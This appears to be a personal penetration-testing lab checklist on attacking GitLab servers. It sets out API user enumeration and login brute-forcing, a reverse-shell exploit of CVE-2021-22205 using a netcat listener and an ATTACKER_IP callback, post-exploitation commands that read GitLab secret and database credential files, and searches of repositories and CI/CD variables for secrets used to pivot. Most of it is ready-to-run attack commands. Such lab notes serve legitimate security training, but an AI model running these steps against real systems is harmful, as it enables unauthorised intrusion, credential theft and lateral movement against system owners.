# GitLab Labs

> Cross-reference: [[gitlab-methodology]]

---

## Lab 1: User Enumeration + Brute Force

- [ ] Enumerate users via API:
```bash
for i in $(seq 1 50); do
  curl -s "http://TARGET/api/v4/users/$i" 2>/dev/null | jq -r '.username // empty'
done
```
- [ ] Attempt default root credentials
- [ ] Brute with caution (10 attempts → 10 min lockout on versions < 16.6)

---

## Lab 2: Authenticated RCE — ExifTool (CVE-2021-22205)

### Objective
Exploit GitLab CE ≤ 13.10.2 via malicious image upload.

### Steps

- [ ] Confirm version ≤ 13.10.2 at `/help`
- [ ] Start listener: `nc -nlvp 4443`
- [ ] Run exploit:
```bash
python3 gitlab_13_10_2_rce.py -u http://TARGET -l ATTACKER_IP -p 4443
```
- [ ] Alternative — manual via crafted DjVu image:
  - Create malicious image with embedded ExifTool payload
  - Login → Create project → New issue → Attach image
  - GitLab processes metadata → triggers reverse shell
- [ ] Catch shell, verify: `id`, `whoami`
- [ ] Post-exploitation:
```bash
cat /etc/gitlab/gitlab-secrets.json
cat /etc/gitlab/gitlab.rb | grep -i password
cat /var/opt/gitlab/gitlab-rails/etc/database.yml
```

---

## Lab 3: Repository Secret Harvesting

- [ ] After gaining access (login or RCE), enumerate repos
- [ ] Search for secrets:
```bash
# In GitLab web UI: use search bar for "password", "secret", "key"
# Via git CLI after cloning:
git log -p --all -S 'password'
git log -p --all -S 'secret'
grep -r "API_KEY\|SECRET\|TOKEN\|PASSWORD" .
```
- [ ] Check CI/CD variables: Settings → CI/CD → Variables
- [ ] Use found creds to pivot
